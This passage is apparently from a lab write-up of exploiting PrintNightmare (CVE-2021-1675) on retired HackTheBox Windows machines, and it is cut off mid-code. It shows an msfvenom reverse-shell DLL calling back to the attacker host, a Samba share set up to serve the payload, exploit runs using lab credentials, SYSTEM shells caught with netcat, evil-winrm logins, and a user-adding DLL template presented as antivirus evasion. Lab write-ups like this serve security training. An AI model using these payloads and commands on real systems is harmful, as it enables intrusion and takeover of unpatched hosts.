</span></span><span class=line><span class=cl>$ msfvenom -p windows/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.75 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> -f dll &gt; revshell.dll  
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class=line><span class=cl>No encoder specified, outputting raw payload
</span></span><span class=line><span class=cl>Payload size: <span class=m>460</span> bytes
</span></span><span class=line><span class=cl>Final size of dll file: <span class=m>8704</span> bytes
</span></span></code></pre></div><h4 id=samba-server-configuration>Samba Server Configuration<a class=anchor aria-hidden=true href=#samba-server-configuration>#</a></h4><p>The exploit repo includes a guide on how to configure a Samba server for hosting the DLL payload in the README file, so I will use that for reference.</p><p>First, I will create a backup of the original Samba configuration file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ sudo cp /etc/samba/smb.conf<span class=o>{</span>,.bak<span class=o>}</span>
</span></span></code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[global]
</span></span><span class=line><span class=cl>   server role = standalone server
</span></span><span class=line><span class=cl>   smb ports = 445
</span></span><span class=line><span class=cl>   map to guest = bad user
</span></span><span class=line><span class=cl>   usershare allow guests = yes
</span></span><span class=line><span class=cl>   idmap config * : backend = tdb
</span></span><span class=line><span class=cl>   log file = /var/log/samba/log.%m
</span></span><span class=line><span class=cl>   max log size = 1000
</span></span><span class=line><span class=cl>   logging = file
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>[ef]
</span></span><span class=line><span class=cl>    comment = Samba
</span></span><span class=line><span class=cl>    path = /opt/printnightmare/dll
</span></span><span class=line><span class=cl>    guest ok = yes
</span></span><span class=line><span class=cl>    read only = no
</span></span><span class=line><span class=cl>    browsable = yes
</span></span></code></pre></div><p>Lastly, I will start the Samba service.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ sudo systemctl start smbd 
</span></span></code></pre></div><h2 id=target-machines>Target Machines<a class=anchor aria-hidden=true href=#target-machines>#</a></h2><p>As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.</p><div class=table-wrapper><table><thead><tr><th style=text-align:center>Target</th><th style=text-align:center>IP</th><th style=text-align:center>Low Priv Credentials [username:password]</th></tr></thead><tbody><tr><td style=text-align:center>Active</td><td style=text-align:center>10.10.10.100</td><td style=text-align:center><code>svc_tgs:GPPstillStandingStrong2k18</code></td></tr><tr><td style=text-align:center>Bastion</td><td style=text-align:center>10.10.10.134</td><td style=text-align:center><code>l4mpje:bureaulampje</code></td></tr><tr><td style=text-align:center>Heist</td><td style=text-align:center>10.10.10.149</td><td style=text-align:center><code>hazard:stealth1agent</code></td></tr><tr><td style=text-align:center>Forest</td><td style=text-align:center>10.10.10.161</td><td style=text-align:center><code>svc-alfresco:s3rvice</code></td></tr><tr><td style=text-align:center>Atom</td><td style=text-align:center>10.10.10.237</td><td style=text-align:center><code>jason:kidvscat_electron_@123</code></td></tr></tbody></table></div><h2 id=target-scanning>Target Scanning<a class=anchor aria-hidden=true href=#target-scanning>#</a></h2><p>According to <a href=https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html>this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p><ol><li>Print Spooler Service enabled on the target system</li><li>Network connectivity to the target system (initial access has been obtained)</li><li>Hash or password for a low privileged user (or computer) account</li></ol><p>Since no. 2 and no. 3 are satisfied already, now I just need to verify if the Print Spooler service enabled on the targets.</p><p>As instructed by the exploit author, I can use <code>rpcdump.py</code> to determine whether the Spooler service is running.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ rpcdump.py @<span class=o>[</span>IP-ADDRESS<span class=o>]</span> <span class=p>|</span> egrep <span class=s1>&#39;MS-RPRN|MS-PAR&#39;</span>
</span></span></code></pre></div><p>I figured out that <code>rpcclient</code> can also be used to detect the availability of Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p><p>The following is a dirty bash script I created as a wrapper for checking via <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>targets</span><span class=o>=</span><span class=nv>$1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -z <span class=s2>&#34;</span><span class=nv>$targets</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> <span class=s2>&#34;[-] Usage\t: </span><span class=nv>$0</span><span class=s2> [Target file]&#34;</span> 
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> <span class=s2>&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> target in <span class=sb>`</span>cat <span class=nv>$targets</span><span class=sb>`</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>		 <span class=nv>ip</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$target</span> <span class=p>|</span> cut -d <span class=s1>&#39;:&#39;</span> -f1<span class=k>)</span>
</span></span><span class=line><span class=cl>		 <span class=nv>username</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$target</span> <span class=p>|</span> cut -d <span class=s1>&#39;:&#39;</span> -f2<span class=k>)</span>
</span></span><span class=line><span class=cl>		 <span class=nv>password</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$target</span> <span class=p>|</span> cut -d <span class=s1>&#39;:&#39;</span> -f3<span class=k>)</span>
</span></span><span class=line><span class=cl>		 <span class=nb>echo</span>  <span class=s2>&#34; - [</span><span class=nv>$ip</span><span class=s2>] - &#34;</span> 
</span></span><span class=line><span class=cl>		 impacket-rpcdump <span class=nv>$ip</span> <span class=p>|</span> egrep <span class=s1>&#39;MS-RPRN|MS-PAR&#39;</span>
</span></span><span class=line><span class=cl>		 rpcclient -U <span class=s2>&#34;</span><span class=nv>$username</span><span class=s2>%</span><span class=nv>$password</span><span class=s2>&#34;</span> <span class=nv>$ip</span> -c <span class=s2>&#34;enumprinters;quit&#34;</span>
</span></span><span class=line><span class=cl>	<span class=k>done</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ ./detect-nightmare.sh target-machines
</span></span><span class=line><span class=cl> - <span class=o>[</span>10.10.10.100<span class=o>]</span> - 
</span></span><span class=line><span class=cl>Protocol: <span class=o>[</span>MS-RPRN<span class=o>]</span>: Print System Remote Protocol 
</span></span><span class=line><span class=cl>Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
</span></span><span class=line><span class=cl> - <span class=o>[</span>10.10.10.134<span class=o>]</span> - 
</span></span><span class=line><span class=cl>Protocol: <span class=o>[</span>MS-PAR<span class=o>]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class=line><span class=cl>Protocol: <span class=o>[</span>MS-RPRN<span class=o>]</span>: Print System Remote Protocol 
</span></span><span class=line><span class=cl>No printers returned.
</span></span><span class=line><span class=cl> - <span class=o>[</span>10.10.10.149<span class=o>]</span> - 
</span></span><span class=line><span class=cl>Protocol: <span class=o>[</span>MS-PAR<span class=o>]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class=line><span class=cl>Protocol: <span class=o>[</span>MS-RPRN<span class=o>]</span>: Print System Remote Protocol 
</span></span><span class=line><span class=cl>No printers returned.
</span></span><span class=line><span class=cl> - <span class=o>[</span>10.10.10.161<span class=o>]</span> - 
</span></span><span class=line><span class=cl>Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
</span></span><span class=line><span class=cl> - <span class=o>[</span>10.10.10.237<span class=o>]</span> - 
</span></span><span class=line><span class=cl>Protocol: <span class=o>[</span>MS-PAR<span class=o>]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class=line><span class=cl>Protocol: <span class=o>[</span>MS-RPRN<span class=o>]</span>: Print System Remote Protocol 
</span></span><span class=line><span class=cl>No printers returned.
</span></span></code></pre></div><p>Based on the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p><h2 id=exploitation-1st-attempt>Exploitation 1st Attempt<a class=anchor aria-hidden=true href=#exploitation-1st-attempt>#</a></h2><h3 id=active-failed>Active (failed)<a class=anchor aria-hidden=true href=#active-failed>#</a></h3><p>As expected, on Active the exploit is failed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class=o>(</span>main<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class=s1>&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class=s1>&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to ncacn_np:10.10.10.100<span class=o>[</span><span class=se>\P</span>IPE<span class=se>\s</span>poolss<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Connection Failed
</span></span></code></pre></div><h3 id=bastion-failed>Bastion (failed)<a class=anchor aria-hidden=true href=#bastion-failed>#</a></h3><p>I ran the exploit against Bastion, and it connected but then the DLL got removed by AV 😂.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class=o>(</span>main<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ python3 CVE-2021-1675.py Bastion/l4mpje:<span class=s1>&#39;bureaulampje&#39;</span>@10.10.10.134 <span class=s1>&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to ncacn_np:10.10.10.134<span class=o>[</span><span class=se>\P</span>IPE<span class=se>\s</span>poolss<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Bind OK
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> pDriverPath Found C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\D</span>riverStore<span class=se>\F</span>ileRepository<span class=se>\n</span>tprint.inf_amd64_1734185bdb8f8610<span class=se>\A</span>md64<span class=se>\U</span>NIDRV.DLL
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Executing <span class=se>\?</span>?<span class=se>\U</span>NC<span class=se>\1</span>0.10.14.75<span class=se>\e</span>f<span class=se>\r</span>evshell.dll
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try 1...
</span></span><span class=line><span class=cl>Traceback <span class=o>(</span>most recent call last<span class=o>)</span>:
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class=nb>complete</span> successfully because the file contains a virus or potentially unwanted software
</span></span></code></pre></div><h3 id=heist-success>Heist (success)<a class=anchor aria-hidden=true href=#heist-success>#</a></h3><p>On Heist, the exploit didn&rsquo;t show any indication of a successful exploitation.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class=o>(</span>main<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ python3 CVE-2021-1675.py heist/hazard:<span class=s1>&#39;stealth1agent&#39;</span>@10.10.10.149 <span class=s1>&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to ncacn_np:10.10.10.149<span class=o>[</span><span class=se>\P</span>IPE<span class=se>\s</span>poolss<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Bind OK
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> pDriverPath Found C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\D</span>riverStore<span class=se>\F</span>ileRepository<span class=se>\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span class=se>\A</span>md64<span class=se>\U</span>NIDRV.DLL
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Executing <span class=se>\?</span>?<span class=se>\U</span>NC<span class=se>\1</span>0.10.14.75<span class=se>\e</span>f<span class=se>\r</span>evshell.dll
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try 1...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Stage0: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try 2...
</span></span><span class=line><span class=cl>Traceback <span class=o>(</span>most recent call last<span class=o>)</span>:
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class=o>(</span>The specified named pipe is in the closing state.<span class=o>)</span>
</span></span></code></pre></div><p>But strangely, I got a shell on my listener. I&rsquo;ll try to figure this out in the Troubleshoot section.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>4444</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.75<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.149<span class=o>]</span> <span class=m>49700</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.437<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;hostname
</span></span><span class=line><span class=cl>hostname
</span></span><span class=line><span class=cl>SupportDesk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;ipconfig
</span></span><span class=line><span class=cl>ipconfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Windows IP Configuration
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ethernet adapter Ethernet0 2:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . : 
</span></span><span class=line><span class=cl>   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
</span></span><span class=line><span class=cl>   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
</span></span><span class=line><span class=cl>   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class=line><span class=cl>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class=line><span class=cl>   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class=line><span class=cl>                                       10.10.10.2
</span></span></code></pre></div><h3 id=forest-failed>Forest (failed)<a class=anchor aria-hidden=true href=#forest-failed>#</a></h3><p>Similar to Active, the exploit also failed on Forest.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class=o>(</span>main<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class=s1>&#39;s3rvice&#39;</span>@10.10.10.161 <span class=s1>&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to ncacn_np:10.10.10.161<span class=o>[</span><span class=se>\P</span>IPE<span class=se>\s</span>poolss<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Connection Failed
</span></span></code></pre></div><h3 id=atom-success>Atom (success)<a class=anchor aria-hidden=true href=#atom-success>#</a></h3><p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class=o>(</span>main<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ python3 CVE-2021-1675.py ATOM/jason:<span class=s1>&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class=s1>&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to ncacn_np:10.10.10.237<span class=o>[</span><span class=se>\P</span>IPE<span class=se>\s</span>poolss<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Bind OK
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> pDriverPath Found C:<span class=se>\W</span>INDOWS<span class=se>\S</span>ystem32<span class=se>\D</span>riverStore<span class=se>\F</span>ileRepository<span class=se>\n</span>tprint.inf_amd64_c62e9f8067f98247<span class=se>\A</span>md64<span class=se>\U</span>NIDRV.DLL
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Executing <span class=se>\?</span>?<span class=se>\U</span>NC<span class=se>\1</span>0.10.14.75<span class=se>\e</span>f<span class=se>\r</span>evshell.dll
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try 1...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Stage0: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try 2...
</span></span><span class=line><span class=cl>Traceback <span class=o>(</span>most recent call last<span class=o>)</span>:
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class=o>(</span>The specified named pipe is in the closing state.<span class=o>)</span>
</span></span></code></pre></div><p>But then the DLL connected to my listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>4444</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.75<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.237<span class=o>]</span> <span class=m>62322</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.19042.906<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;hostname
</span></span><span class=line><span class=cl>hostname
</span></span><span class=line><span class=cl>ATOM
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;ipconfig
</span></span><span class=line><span class=cl>ipconfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Windows IP Configuration
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ethernet adapter Ethernet0:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . : 
</span></span><span class=line><span class=cl>   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
</span></span><span class=line><span class=cl>   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
</span></span><span class=line><span class=cl>   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
</span></span><span class=line><span class=cl>   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
</span></span><span class=line><span class=cl>   IPv4 Address. . . . . . . . . . . : 10.10.10.237
</span></span><span class=line><span class=cl>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class=line><span class=cl>   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class=line><span class=cl>                                       10.10.10.2
</span></span></code></pre></div><h2 id=exploitation-2nd-attempt>Exploitation 2nd Attempt<a class=anchor aria-hidden=true href=#exploitation-2nd-attempt>#</a></h2><h4 id=changing-dll-payload>Changing DLL Payload<a class=anchor aria-hidden=true href=#changing-dll-payload>#</a></h4><p>I&rsquo;m sure that the following error was caused by my DLL payload.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
</span></span></code></pre></div><p>Instead of using the DLL to create a malicious user (so it&rsquo;s just one-time load/execution/thread/I don&rsquo;t know), I used the DLL for reverse shell, which requires it to maintain the pipe. Without digging deeper, this was my best guess atm.</p><p>Now let&rsquo;s see if changing the payload will get rid of the error.</p><p>I will use the following script which I stole from this <a href=https://github.com/calebstewart/CVE-2021-1675>PoC</a> script created by Caleb Stewart and John Hammond to generate a new DLL (I&rsquo;m lazy to compile a new one from scratch) :</p><script type=application/javascript src=https://gist.github.com/fahmifj/f3f3166eba91e97aed7c16c88e1f76c0.js></script><p>To generate the DLL, I&rsquo;ll just invoke <code>Get-NightmareDLL</code> within a PowerShell session.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
</span></span><span class=line><span class=cl>PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
</span></span></code></pre></div><p>Now when I ran the exploit again on Atom, it didn&rsquo;t crash this time, instead it showed the indication of a successful exploitation.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class=o>(</span>main<span class=o>)</span> ✗ 
</span></span><span class=line><span class=cl>$ python3 CVE-2021-1675.py ATOM/jason:<span class=s1>&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class=s1>&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to ncacn_np:10.10.10.237<span class=o>[</span><span class=se>\P</span>IPE<span class=se>\s</span>poolss<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Bind OK
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> pDriverPath Found C:<span class=se>\W</span>INDOWS<span class=se>\S</span>ystem32<span class=se>\D</span>riverStore<span class=se>\F</span>ileRepository<span class=se>\n</span>tprint.inf_amd64_c62e9f8067f98247<span class=se>\A</span>md64<span class=se>\U</span>NIDRV.DLL
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Executing <span class=se>\?</span>?<span class=se>\U</span>NC<span class=se>\1</span>0.10.14.75<span class=se>\e</span>f<span class=se>\n</span>ightmare.dll
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try 1...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Stage0: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try 2...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Stage0: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Stage2: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Exploit Completed
</span></span></code></pre></div><p>Now I can login with credentials of <code>adm1n:P@ssw0rd</code> (default credentials from the stolen payload) using <code>evil-winrm</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «dll» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ evil-winrm -i 10.10.10.237 -u <span class=s1>&#39;adm1n&#39;</span> -p <span class=s1>&#39;P@ssw0rd&#39;</span>                                                       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\a</span>dm1n<span class=se>\D</span>ocuments&gt; whoami /groups <span class=p>|</span> <span class=k>select</span>-string <span class=s2>&#34;Administrators&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\a</span>dm1n<span class=se>\D</span>ocuments&gt; hostname
</span></span><span class=line><span class=cl>ATOM
</span></span></code></pre></div><h4 id=av-evasion-with-self-compile>AV Evasion with self-compile<a class=anchor aria-hidden=true href=#av-evasion-with-self-compile>#</a></h4><p>Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload from <a href=https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own>BookHackTrick</a> DLL templates can resolve this (I should do this earlier 😅🔨).</p><p>The following is the template that I use.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
</span></span></span><span class=line><span class=cl><span class=c1>// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span><span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>Entry</span> <span class=p>(){</span> <span class=c1>//Default function that is executed when the DLL is loaded
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;cmd.exe /c net user iamf &lt;password&gt; /add&#34;</span><span class=p>);</span>
